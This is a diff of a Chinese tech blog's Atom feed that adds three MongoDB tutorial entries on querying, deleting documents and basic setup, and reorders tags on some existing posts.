@@ -111,6 +111,92 @@
   </entry>
   
   <entry>
+    <title>MongoDB查询操作</title>
+    <link href="http://c.cat.plus/2018/03/13/MongoDB/MongoDB%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C/"/>
+    <id>http://c.cat.plus/2018/03/13/MongoDB/MongoDB%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C/</id>
+    <published>2018-03-13T10:16:08.000Z</published>
+    <updated>2020-07-19T10:13:52.199Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="MySQL和MongoDB查找操作对比"><a href="#MySQL和MongoDB查找操作对比" class="headerlink" title="MySQL和MongoDB查找操作对比"></a><strong>MySQL和MongoDB查找操作对比</strong></h4><pre><code>mysql:select ... from tableName where ...db.collectionName.find()    同mysql-&gt; select * from tableName</code></pre><h4 id="find-query-field-查找函数"><a href="#find-query-field-查找函数" class="headerlink" title="find(query,field)查找函数"></a><strong>find(query,field)</strong>查找函数</h4><ul><li>功能: 查找所有复合条件的文档</li><li>参数:<ul><li>query:    筛选条件 相当于where子句</li><li>field:    展示的域 相当于select的展示部分</li></ul></li><li>返回: 返回所有查找到的内容</li></ul><p><strong>field 参数</strong>: 选择要展示的域 传一组键值对</p><ul><li><p>键表示域名</p></li><li><p>值表示是否显示该域 0 表示不显示 1 表示显示</p></li><li><p>如果某个域给定0 则表示不显示该域,其他的域均显示</p></li><li><p>如果某个域给定1 则表示显示该域,其他的域都不显示</p></li><li><p><code>_id</code> 永远默认为显示,除非设置为0</p></li><li><p>除_id外其他域必须拥有相同的设置,全为0或者全为1</p></li><li><p>如果不写该参数则表示显示所有域内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0&#125;)</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0,name:1&#125;)</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0,name:1,age:1&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>query参数</strong>: 以键值对的形式给出查找条件</p><ul><li>查找年龄 17<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;age:17&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li><li>如果不写第一个参数则表示查找所有内容</li></ul><h5 id="findOne"><a href="#findOne" class="headerlink" title="findOne()"></a><strong>findOne()</strong></h5><ul><li>功能参数和 <code>find()</code> 完全相同,只是只返回第一条查找到的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.findOne(&#123;age:17&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="query的更多用法"><a href="#query的更多用法" class="headerlink" title="query的更多用法"></a><strong>query的更多用法</strong></h4><ul><li>操作符: 使用$符号注明一个特殊字符串,表示一定的含义<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$lt#表示小于</span><br></pre></td></tr></table></figure></li></ul><h5 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a><strong>比较操作符</strong></h5><pre><code>$eq        #等于    ==db.class0.find({age:{$eq:17}},{_id:0})#筛选年龄等于17的db.class0.find({age:17},{_id:0})    #直接查一样,等于一般用得少$lt        #小于    &lt;db.class0.find({age:{$lt:17}},{_id:0})#mongo中字符串也可以比较大小$lte    #小于等于    &lt;=db.class0.find({age:{$lte:17}},{_id:0})$gt        #大于    &gt;db.class0.find({age:{$gt:17}},{_id:0})$gte    #大于等于    &gt;=db.class0.find({age:{$gte:17}},{_id:0})$ne        #不等于        !=db.class0.find({age:{$ne:17}},{_id:0})#如果一个文档没有这个age域也显示为不等于$in        #包含db.class0.find({age:{$in:[16,17,18]}},{_id:0})#nin    #不包含db.class0.find({age:{$nin:[16,17,18]}},{_id:0})</code></pre><h5 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a><strong>逻辑操作符</strong></h5><pre><code>$and    #逻辑与#年龄小于19且性别是男db.class0.find({age:{$lt:19},sex:&apos;m&apos;},{_id:0})#年龄小于19且大于15db.class0.find({age:{$lt:19,$gt:15}},{_id:0})$and逻辑语法db.class0.find({$and:[{age:17},{name:&apos;Lei&apos;}]})$or        #逻辑或db.class0.find({$or:[{age:{$lt:22}},{name:&apos;wukong&apos;}]},{_id:0})db.class0.find({$or:[{age:{lt:18}},{age:{$gt:30}}]},{_id:0})$not    #逻辑非db.class0.find({age:{$not:{$eq:17}}},{_id:0})$nor    #既不也不db.class0.find({$nor:[{age:{$gt:18}},{sex:&apos;m&apos;}]},{_id:0})</code></pre><p><strong>条件混合</strong></p><ul><li>(年龄小于20 <strong>或者</strong> 姓名为Lei) <strong>并且</strong> 性别为女的人<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;$and:[&#123;$or:[&#123;age:&#123;$lt:20&#125;&#125;,&#123;name:&#39;Lily&#39;&#125;]&#125;,&#123;sex:&#39;w&#39;&#125;]&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="数组查找"><a href="#数组查找" class="headerlink" title="数组查找"></a><strong>数组查找</strong></h4><pre><code>#查看数组中包含某一项的db.class1.find({hobby:&apos;python&apos;},{_id:0})$all#查找一个数组中同时包含多项的文档db.class1.find({hobby:{$all:[&apos;python&apos;,&apos;mongodb&apos;]}},{_id:0})$size#查找数组元素个数为指定个数的文档db.class1.find({hobby:{$size:3}},{_id:0})#数组切片显示,对数组进行切片显示$slicedb.class1.find({hobby:{$size:3}},{_id:0,hobby:{$slice:2}})             #显示前两项db.class1.find({hobby:{$size:3}},{_id:0,hobby:{$slice:[1,2]}})        #显示后两项</code></pre><h4 id="其它查找方法"><a href="#其它查找方法" class="headerlink" title="其它查找方法"></a><strong>其它查找方法</strong></h4><pre><code>#判断一个域是否存在$existse.g.    查找存在hobby域的文档db.class1.find({hobby:{$exists:true}},{_id:0})e.g.    查找不存在sex域的文档db.class1.find({sex:{$exists:false}},{_id:0})$mod#做除数余数查找e.g        查找age域 被2除余1的文档,就是单数db.class1.find({age:{$mod:[2,1]}},{_id:0})e.g        查找age域 被3除余0的文档,整除db.class1.find({age:{$mod:[3,0]}},{_id:0})$type#查找指定数据类型的文档#monggodb为每种数据类型作了编号,对照如下官方文档https://docs.mongodb.com/manual/reference/operator/query/type/index.htmle.g.    查找age域为整数类型db.class1.find({age:{$type:1}},{_id:0})e.g.    查找name域为字符串类型db.class1.find({name:{$type:2}},{_id:0})e.g.    查找hobby域为数组类型db.class1.find({hobby:{$type:4}},{_id:0])</code></pre><h4 id="进一步的信息筛选"><a href="#进一步的信息筛选" class="headerlink" title="进一步的信息筛选"></a><strong>进一步的信息筛选</strong></h4><p><strong>distinct()函数</strong> 去重</p><ul><li>功能: 查看一个集合中某个域值的覆盖范围  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g. 查看集合中hobby域的值都有哪些</span><br><span class="line">db.class1.distinct(&#39;hobby&#39;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>pretty(n)</strong> 格式化显示</p><ul><li>功能: 将查询结果格式化显示  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find().pretty()</span><br></pre></td></tr></table></figure></li></ul><p><strong>limit(n)</strong> 限制</p><ul><li>功能: 查询结果显示前 n条  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询结果显示前3个</span><br><span class="line">db.class1.find(&#123;&#125;&#123;_id:0&#125;).limit(3)</span><br></pre></td></tr></table></figure></li></ul><p><strong>skip(n)</strong></p><ul><li>功能: 查询结果跳过前 n条  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.显示时跳过前3条</span><br><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;).skip(3)</span><br></pre></td></tr></table></figure></li></ul><p><strong>count()</strong> 计数</p><ul><li>功能: 对查找结果计数统计  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.统计sex字段为m的文档数量</span><br><span class="line">db.class0.find(&#123;sex:&#39;m&#39;&#125;,&#123;_id:0&#125;).count()</span><br></pre></td></tr></table></figure></li></ul><p><strong>sort({键:1/-1})</strong></p><ul><li>功能: 对查找结果排序</li><li>1表示按照升序排列, -1表示按照降序排列  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.对查询结果按照年龄升序排列</span><br><span class="line">db.class1.find(&#123;age:&#123;$exists:true&#125;&#125;,&#123;_id:0&#125;).sort(&#123;age:1&#125;)</span><br><span class="line"></span><br><span class="line">e.g复合排序: 当第一排序项相同的时候,按照第二排序项排序</span><br><span class="line">db.class1.find(&#123;age:&#123;$exists:true&#125;&#125;,&#123;_id:0&#125;).sort(&#123;age:1,name:-1&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="函数的连续使用"><a href="#函数的连续使用" class="headerlink" title="函数的连续使用"></a><strong>函数的连续使用</strong></h4><ul><li>获取集合中年龄最小的前3个文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;).sort(&#123;age:1&#125;).limit(3)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;MySQL和MongoDB查找操作对比&quot;&gt;&lt;a href=&quot;#MySQL和MongoDB查找操作对比&quot; class=&quot;headerlink&quot; title=&quot;MySQL和MongoDB查找操作对比&quot;&gt;&lt;/a&gt;&lt;strong&gt;MySQL和MongoDB查找操作对比&lt;/
+      
+    
+    </summary>
+    
+    
+      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
+    
+      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
+    
+    
+      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MongoDB删除文档操作</title>
+    <link href="http://c.cat.plus/2018/03/13/MongoDB/MongoDB%E5%88%A0%E9%99%A4%E6%96%87%E6%A1%A3%E6%93%8D%E4%BD%9C/"/>
+    <id>http://c.cat.plus/2018/03/13/MongoDB/MongoDB%E5%88%A0%E9%99%A4%E6%96%87%E6%A1%A3%E6%93%8D%E4%BD%9C/</id>
+    <published>2018-03-13T10:16:08.000Z</published>
+    <updated>2020-07-19T10:45:58.555Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="MySQL和MongoDB对比删除操作"><a href="#MySQL和MongoDB对比删除操作" class="headerlink" title="MySQL和MongoDB对比删除操作"></a><strong>MySQL和MongoDB对比删除操作</strong></h4><ul><li><strong>MySQL</strong>:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from tableName where ...</span><br></pre></td></tr></table></figure></li><li><strong>MongoDB</strong>:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.remove(query,justOne)</span><br></pre></td></tr></table></figure></li><li>功能: 删除指定的文档</li><li>参数:<ul><li>query: 筛选要删除的文档,类似where子句,同法同查找操作</li><li>justOne: 布尔值 , 默认为 false 表示删除所有筛选数据,如果赋值为true 则表示只删除第一条符合的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.删除age域不存在 或者 age域大于100的文档</span><br><span class="line">db.class0.remove(&#123;$or:[&#123;age:&#123;$exists:false&#125;&#125;,&#123;age:&#123;$gt:100&#125;&#125;]&#125;)</span><br><span class="line"></span><br><span class="line">e.g.删除第一个符合条件的文档</span><br><span class="line">db.class0.remove(&#123;sex:&#123;exists:false&#125;&#125;,true)</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>删除集合中所有文档</strong></p><pre><code>db.collectionName.remove({})e.g.db.class1.remove({})</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;MySQL和MongoDB对比删除操作&quot;&gt;&lt;a href=&quot;#MySQL和MongoDB对比删除操作&quot; class=&quot;headerlink&quot; title=&quot;MySQL和MongoDB对比删除操作&quot;&gt;&lt;/a&gt;&lt;strong&gt;MySQL和MongoDB对比删除操作&lt;/
+      
+    
+    </summary>
+    
+    
+      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
+    
+      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
+    
+    
+      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>非关系型数据库MongoDB简介</title>
+    <link href="http://c.cat.plus/2018/03/12/MongoDB/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93MongoDB%E7%AE%80%E4%BB%8B/"/>
+    <id>http://c.cat.plus/2018/03/12/MongoDB/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93MongoDB%E7%AE%80%E4%BB%8B/</id>
+    <published>2018-03-12T09:56:18.000Z</published>
+    <updated>2020-07-19T11:02:59.095Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="非关系型数据库-NoSQL-–-gt-Not-only-SQL"><a href="#非关系型数据库-NoSQL-–-gt-Not-only-SQL" class="headerlink" title="非关系型数据库 (NoSQL –&gt; Not only SQL)"></a><strong>非关系型数据库</strong> (NoSQL –&gt; Not only SQL)</h4><ul><li><p><strong>优点</strong>:</p><ul><li>高并发,大数据读写能力强</li><li>支持分布式,容易扩展</li><li>弱化了数据结构,降低了数据的一致性</li></ul></li><li><p><strong>缺点</strong></p><ul><li>通用性差,没有像SQL那样一致的操作</li><li>操作灵活,容易混乱</li><li>没有join,有些NoSQL没有事务支持等操作</li></ul></li></ul><h4 id="什么场景需要使用到NoSQL"><a href="#什么场景需要使用到NoSQL" class="headerlink" title="什么场景需要使用到NoSQL?"></a><strong>什么场景需要使用到NoSQL?</strong></h4><ul><li>数据一致性要求低</li><li>数据库并发处理要求高</li><li>数据库设计时对大小的估算不确定,需要分布拓展</li><li>给定的数据比较容易建立起NoSQL的模型</li></ul><h4 id="NoSQL分类"><a href="#NoSQL分类" class="headerlink" title="NoSQL分类"></a><strong>NoSQL分类</strong></h4><ol><li><p>键值型数据库</p><ul><li>Redis, Oracle, BDB, tokyo</li></ul></li><li><p>列存储数据库</p><ul><li>HBase</li></ul></li><li><p>文档型数据库</p><ul><li>MongoDB, CouchDB</li></ul></li><li><p>图形数据库</p></li></ol><blockquote><h4 id="MongoDB简介-非关系型-文档型数据库"><a href="#MongoDB简介-非关系型-文档型数据库" class="headerlink" title="MongoDB简介 (非关系型,文档型数据库)"></a><strong>MongoDB简介</strong> (非关系型,文档型数据库)</h4></blockquote><ol><li>MongoDB 是由C++语言编写的,是一个基于分布式文件存储的开源数据库管理系统.</li><li>支持非常丰富的增删改查数据操作,被评为最像关系型数据库的非关系型数据库</li><li>支持非常丰富的数据类型</li><li>使用方便,便于部署,支持分布式,容易拓展</li><li>支持众多的编程语言接口(python,ruby,c++,php…)</li></ol><p><strong>组成结构</strong><br>键值对 —&gt; 文档 —&gt; 集合 —&gt; 数据库</p><h4 id="MongoDB-安装"><a href="#MongoDB-安装" class="headerlink" title="MongoDB 安装"></a><strong>MongoDB 安装</strong></h4><p><strong>linux自动安装</strong></p><pre><code>apt-get install mongodb#默认安装位置    /var/lib/mongodb/#配置文件        /etc/mongodb.conf#命令集            /usr/bin</code></pre><p><strong>手动安装</strong></p><pre><code>#下载解压wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian92-4.2.8.tgztar -zxvf mongodb-linux-x86_64-debian92-4.2.8.tgzmv mongodb-linux-x86_64-debian92-4.2.8.tgz /usr/local/mongodb4#将文件夹下的命令集目录(bin目录)添加到环境变量PATH=$PATH:/usr/local/mongodb4/binexport PATH将以上两句写在 /etc/rc.local重启系统</code></pre><ul><li><code>mongodb</code> 命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath 目录路径</span><br><span class="line">#设置数据库存储位置</span><br><span class="line"></span><br><span class="line">mongod --port 8888</span><br><span class="line">#设置端口号(默认27017)</span><br></pre></td></tr></table></figure></li><li><code>mongo</code> 命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">#进入mongodb的交互shell界面用来操作数据库</span><br></pre></td></tr></table></figure><h4 id="mysql-和-mongodb-概念对比"><a href="#mysql-和-mongodb-概念对比" class="headerlink" title="mysql 和 mongodb 概念对比"></a><strong>mysql 和 mongodb 概念对比</strong></h4></li></ul><table><thead><tr><th align="center">mysql</th><th align="center">mongo</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">database</td><td align="center">database</td><td align="center">数据库</td></tr><tr><td align="center">table</td><td align="center">collection</td><td align="center">表/集合</td></tr><tr><td align="center">column</td><td align="center">field</td><td align="center">字段/域</td></tr><tr><td align="center">row</td><td align="center">document</td><td align="center">记录/文档</td></tr><tr><td align="center">index</td><td align="center">index</td><td align="center">索引</td></tr></tbody></table><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a><strong>创建数据库</strong></h4><pre><code>use databasename#创建一个名为stu的数据库use stu</code></pre><ul><li>use实际功能是表示选择使用哪个数据库,当这个数据库不存在时即表示创建该数据库</li><li>使用use后数据库并不会马上被创建,而是需要插入数据后数据库才会被创建</li></ul><p><strong>数据库名称规则</strong></p><ul><li>原则上是任意满足以下几条的utf-8字符<ol><li>不能是空字符,不能含有空格’ ‘,点 ‘.’ ‘/‘ ‘&#39; ‘\0’</li><li>习惯上使用英文小写</li><li>长度不超过64字节</li><li>不能使用 admin local config 这样的名字</li></ol></li></ul><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a><strong>查看数据库</strong></h5><pre><code>show dbs#mongo系统库admin: 存储用户local: 存储本地数据config: 存储分片配置信息</code></pre><ul><li><strong>db</strong> : mongo系统全局变量,代表你当前正在使用的数据库<ul><li>db 默认为test 如果插入数据即创建test数据库</li></ul></li></ul><h4 id="数据库的备份和恢复"><a href="#数据库的备份和恢复" class="headerlink" title="数据库的备份和恢复"></a><strong>数据库的备份和恢复</strong></h4><ul><li>备份  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h dbhost -d dbname -o dbdir</span><br><span class="line">mongodump -h 127.0.0.1 -d stu -o stu</span><br><span class="line">#将本机下 stu 数据库备份到 当前目录的stu文件夹中,会在stu文件夹中自动生成一个stu文件夹则为备份文件</span><br></pre></td></tr></table></figure></li><li>恢复  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongorestore -h &lt;dbhost&gt;:&lt;port&gt; -d dbname &lt;path&gt;</span><br><span class="line">mongorestore -h 127.0.0.1:27017 -d test stu&#x2F;stu</span><br><span class="line">#将stu文件夹下的备份文件stu恢复到本机的test数据库</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据库的监测命令"><a href="#数据库的监测命令" class="headerlink" title="数据库的监测命令"></a><strong>数据库的监测命令</strong></h4><p><strong>mongostat</strong></p><ul><li>insert query update delete        #每秒增查改删的次数</li><li>getmore command                 #每秒运行命令次数</li><li>dirty used flusher                #每秒操作磁盘的次数</li><li>vsize res                        #使用虚拟内存和物理内存</li></ul><p><strong>mongotop</strong></p><ul><li>监测每个数据库的读写时长</li></ul><table><thead><tr><th align="center">ns</th><th align="center">total</th><th align="center">read</th><th align="center">write</th></tr></thead><tbody><tr><td align="center">数据集合</td><td align="center">总时长</td><td align="center">读时长</td><td align="center">写时长</td></tr></tbody></table><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a><strong>删除数据库</strong></h4><pre><code>db.dropDatabase()#删除db所代表的数据库</code></pre><h4 id="集合-表-的创建"><a href="#集合-表-的创建" class="headerlink" title="集合(表)的创建"></a>集合(表)的创建</h4><pre><code>db.createCollection(collection_name)db.createCollection(&quot;class2&quot;)#在当前数据库下创建一个名字为class2的集合</code></pre><p><strong>查看数据库中的集合</strong>    </p><pre><code>show collectionsshow tables</code></pre><ul><li>集合的命名规则:<ol><li>不能为空字符串,不能有’\0’</li><li>不能以system.开头,这是系统集合的保留前缀</li><li>不能和保留字重复</li></ol></li></ul><p><strong>创建集合2</strong></p><pre><code>db.collectionName.insert()#当向一个集合中插入文档时,如果该集合不存在则自动创建db.cat.insert({a:1})#如果cat不存在则会创建cat集合并插入该数据</code></pre><h5 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a><strong>删除集合</strong></h5><pre><code>db.collectionName.drop()db.cat.drop()#删除cat集合</code></pre><h5 id="集合重命名"><a href="#集合重命名" class="headerlink" title="集合重命名"></a><strong>集合重命名</strong></h5><pre><code>db.collectionName.renameCollection(&apos;new_name&apos;)e.g.db.class2.renameCollection(&apos;class0&apos;)#将class2重命名为class0</code></pre><h4 id="文档-记录"><a href="#文档-记录" class="headerlink" title="文档 (记录)"></a><strong>文档</strong> (记录)</h4><ul><li><p>键值对组成文档 —&gt; 类似Python中的字典</p></li><li><p>bson —&gt; json —&gt; JavaScrip</p></li><li><p>mongodb 中文档的数据组织形式为bson格式,类似Python的字典,也是由键值对构成</p></li><li><p>文档中 <strong>键(域/字段)</strong> 的命名规则:  </p><ol><li>utf-8格式字符串</li><li>不能有\0,习惯上不用 <code>. 和 $</code></li><li>以_开头的多为保留键,自定义时一般不以_开头</li></ol></li><li><p><strong>注意</strong> </p><ul><li>文档键值对是有序的</li><li>mongodb中严格区分大小写</li></ul></li><li><p><strong>值(记录内容)</strong>: mongodb的支持数据类型</p></li><li><p>支持的数据类型</p></li></ul><table><thead><tr><th align="center">类型</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">整型</td><td align="center">整数</td></tr><tr><td align="center">布尔类型</td><td align="center">true false</td></tr><tr><td align="center">浮点型</td><td align="center">小数</td></tr><tr><td align="center">Arrays</td><td align="center">数组类型[1,2,3]</td></tr><tr><td align="center">Timestamp</td><td align="center">时间戳</td></tr><tr><td align="center">Date</td><td align="center">时间日期</td></tr><tr><td align="center">Object</td><td align="center">对象/内部文档</td></tr><tr><td align="center">Null</td><td align="center">空值</td></tr><tr><td align="center">Symbol</td><td align="center">特殊字符</td></tr><tr><td align="center">String</td><td align="center">字符串</td></tr><tr><td align="center">Binary data</td><td align="center">二进制字串</td></tr><tr><td align="center">code</td><td align="center">代码</td></tr><tr><td align="center">regex</td><td align="center">正则表达式</td></tr><tr><td align="center">ObjectId</td><td align="center">ObjectId()字串</td></tr></tbody></table><ul><li>ObjectId : 系统自动为每个文档生成 的不重复的主键<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">键名称: _id</span><br><span class="line">值:ObjectId(&quot;随机24位16进制数&quot;)</span><br><span class="line"></span><br><span class="line">24位16进制数</span><br><span class="line">前8位 文档创建时间</span><br><span class="line">6位 机器ID</span><br><span class="line">4位 进程ID</span><br><span class="line">6位 计数器</span><br></pre></td></tr></table></figure></li></ul><p><strong>集合中文档特点</strong></p><ul><li>集合中的文档域不一定相同 -&gt; 不保证数据一致性</li><li>集合中的文档结构不一定相同</li></ul><p><strong>集合设计原则</strong></p><ul><li>集合中的文档尽可能描述的数据类似</li><li>同一类文档放在相同的集合,不同的文档分集合存放</li><li>层次的包裹不宜太多</li></ul><h4 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a><strong>插入文档</strong></h4><pre><code>db.collectionName.insert()e.g.db.class0.insert({name:&apos;Lucy&apos;,age:16,sex:&apos;w&apos;})#当作为文档插入时键可以不加引号</code></pre><p><strong>查看插入结果</strong></p><pre><code>db.class0.find()</code></pre><p><strong>插入多条文档</strong></p><pre><code>db.collectionName.insert([{},{},{}])e.g.db.class0.insert([{name:&apos;阿猫&apos;,age:22},{name:&apos;阿狗&apos;,age:23},{name:&apos;宝宝&apos;,age:3}])</code></pre><ul><li><code>_id</code> 为系统自动添加主键,如果自己写 <code>_id</code>域则会使用自己写的值,但是该值仍不允许重复</li></ul><p><strong>save 插入数据</strong></p><pre><code>db.collectionName.save()e.g.db.class0.save({name:&apos;bajie&apos;,age:17,sex:&apos;m&apos;})db.class0.save({_id:2,name:&apos;bajie&apos;,age:17,sex:&apos;m&apos;})db.class0.save({_id:2,name:&apos;wukong&apos;,age:17,sex:&apos;m&apos;})</code></pre><ul><li>在不加_id时使用同 insert</li><li>如果使用save插入的时候加了_id,则如果_id值不存在则正常插入,如果该值存在,则修改原来内容</li><li>save无法一次插入多个文档</li></ul><h4 id="获取集合对象"><a href="#获取集合对象" class="headerlink" title="获取集合对象"></a><strong>获取集合对象</strong></h4><pre><code>db.getCollection(&apos;collection_name&apos;)e.g.db.getCollection(&quot;class0&quot;).insert({name:&apos;wukong&apos;,age:1700})</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;非关系型数据库-NoSQL-–-gt-Not-only-SQL&quot;&gt;&lt;a href=&quot;#非关系型数据库-NoSQL-–-gt-Not-only-SQL&quot; class=&quot;headerlink&quot; title=&quot;非关系型数据库 (NoSQL –&amp;gt; Not only 
+      
+    
+    </summary>
+    
+    
+      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
+    
+      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
+    
+    
+      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
+    
+      <category term="nosql" scheme="http://c.cat.plus/tags/nosql/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Python编程使用MySQL</title>
     <link href="http://c.cat.plus/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/"/>
     <id>http://c.cat.plus/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/</id>
@@ -228,17 +314,17 @@ ro
     
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
     
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
+    
+      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
     
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
       <category term="python" scheme="http://c.cat.plus/tags/python/"/>
-    
-      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
-    
-      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
     
       <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
     
@@ -273,11 +359,11 @@ ro
     
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
-      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
-    
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
       <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
+      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
     
       <category term="passing-the-hash" scheme="http://c.cat.plus/tags/passing-the-hash/"/>
     
@@ -314,17 +400,17 @@ ro
     
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
     
-      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
-    
-      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
       <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
     
